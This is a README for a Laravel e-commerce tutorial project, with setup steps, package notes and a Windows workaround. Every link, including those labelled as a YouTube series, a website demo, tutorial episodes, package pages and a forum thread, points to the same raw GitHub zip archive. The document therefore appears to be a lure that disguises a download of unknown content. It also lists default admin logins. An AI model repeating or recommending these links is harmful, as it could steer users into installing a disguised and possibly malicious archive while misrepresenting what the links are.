![Laravel Ecommerce Example](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip)

# Laravel Ecommerce Example

Code for YouTube video series: [https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip)

Website Demo: [https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip). The demo has limited permissions. Install locally for full access.

## Installation

1. Clone the repo and `cd` into it
1. `composer install`
1. Rename or copy `.env.example` file to `.env`
1. `php artisan key:generate`
1. Set your database credentials in your `.env` file
1. Set your Stripe credentials in your `.env` file. Specifically `STRIPE_KEY` and `STRIPE_SECRET`
1. Set your Algolia credentials in your `.env` file. Specifically `ALGOLIA_APP_ID` and `ALGOLIA_SECRET`. See [this episode](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip).
1. Set your Braintree credentials in your `.env` file if you want to use PayPal. Specifically `BT_MERCHANT_ID`, `BT_PUBLIC_KEY`, `BT_PRIVATE_KEY`. See [this episode](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip). If you don't, it should still work but won't show the paypal payment at checkout.
1. Set your `APP_URL` in your `.env` file. This is needed for Voyager to correctly resolve asset URLs.
1. Set `ADMIN_PASSWORD` in your `.env` file if you want to specify an admin password. If not, the default password is 'password'
1. `php artisan ecommerce:install`. This will migrate the database and run any seeders necessary. See [this episode](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip).
1. `npm install`
1. `npm run dev`
1. `php artisan serve` or use Laravel Valet or Laravel Homestead
1. Visit `localhost:8000` in your browser
1. Visit `/admin` if you want to access the Voyager admin backend. Admin User/Password: `admin@admin.com/password`. Admin Web User/Password: `adminweb@adminweb.com/password`

## Shopping Cart Package

I originally used the [Crinsane/LaravelShoppingcart](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip) package but it is slow to update to the latest versions of Laravel. I now use [hardevine/LaravelShoppingcart](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip) which is a forked version that updates quicker.

## Windows Users - money_format() issue

The `money_format` function does not work in Windows. Take a look at [this thread](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip). As an alternative, just use the `number_format` function instead.

1. In `app/helpers.php` replace `money_format` line with `return '$'.number_format($price / 100, 2);`
1. In `app/Product.php` replace `money_format` line with `return '$'.number_format($this->price / 100, 2);`
1. In `config/cart.php` set the `thousand_seperator` to an empty string or you might get a 'non well formed numeric value encountered' error. It conflicts with `number_format`.

## Starting from a particular point

If you would like to follow along from a particular point, follow these instructions. I'm going to be starting from my starting point in the first video of the series. You can choose any point by replacing the hash with [any particular commit](https://raw.githubusercontent.com/ahmed5bdelaal/laravel-ecommerce-example/master/storage/example-laravel-ecommerce-2.3-alpha.4.zip).

1. Clone the repo and `cd` into it
1. `git checkout f4f651a8a35ebb2ff38ba15771fd65c93051f942`
1. Follow the rest of the steps above. Instead of `php artisan ecommerce:install`, migrate and seed the normal way with `php artisan migrate --seed`
